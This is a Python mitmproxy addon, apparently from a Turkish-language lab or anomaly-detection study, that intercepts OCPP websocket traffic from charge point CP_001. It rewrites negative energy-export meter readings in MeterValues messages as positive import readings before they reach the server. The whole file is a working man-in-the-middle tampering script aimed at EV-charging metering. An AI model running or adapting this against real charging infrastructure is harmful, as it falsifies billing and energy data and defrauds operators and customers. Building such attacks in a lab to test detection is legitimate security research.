from mitmproxy import http, ctx
import json


class OCPPAttacker:
    def websocket_message(self, flow: http.HTTPFlow):
        try:
            # Sadece Kurbandan (CP_001) sunucuya giden mesajları işle
            if not flow.messages[-1].from_client or not flow.request.pretty_url.endswith("/CP_001"):
                return

            message = flow.messages[-1]
            payload_str = message.text
            ocpp_msg = json.loads(payload_str)
            action = ocpp_msg[2]  # Mesajın Eylemini (örn: "MeterValues") al

            ctx.log.info(f"*** MitM: Client'tan '{action}' mesajı yakalandı ***")

            # Sadece 'MeterValues' mesajını manipüle et
            if action == "MeterValues":
                sampled_value_obj = ocpp_msg[3]['meterValue'][0]['sampledValue'][0]
                original_value = sampled_value_obj['value']
                original_measurand = sampled_value_obj.get('measurand')

                # Anomaliyi uygula: Negatif Satışı (-10000 Export), Pozitif Alışa (+10000 Import) çevir
                if original_value < 0 and original_measurand == "Energy.Active.Export.Register":
                    new_value = abs(original_value)
                    new_measurand = "Energy.Active.Import.Register"

                    sampled_value_obj['value'] = new_value
                    sampled_value_obj['measurand'] = new_measurand

                    ctx.log.info(f"*** MitM: ANOMALİ ENJEKTE EDİLDİ! (-10000 Export -> +10000 Import) ***")

                # Manipüle edilmiş mesajı giden mesaja yaz
                message.text = json.dumps(ocpp_msg)

        except Exception as e:
            # Script çökerse, bunu terminalde göster
            ctx.log.error(f"!!! ATTACK SCRIPT HATASI: {e}")
            # Hata durumunda bağlantıyı kapat ki istemci bilsin
            flow.kill()


# mitmproxy'e bu eklentiyi yükle
addons = [
    OCPPAttacker()
]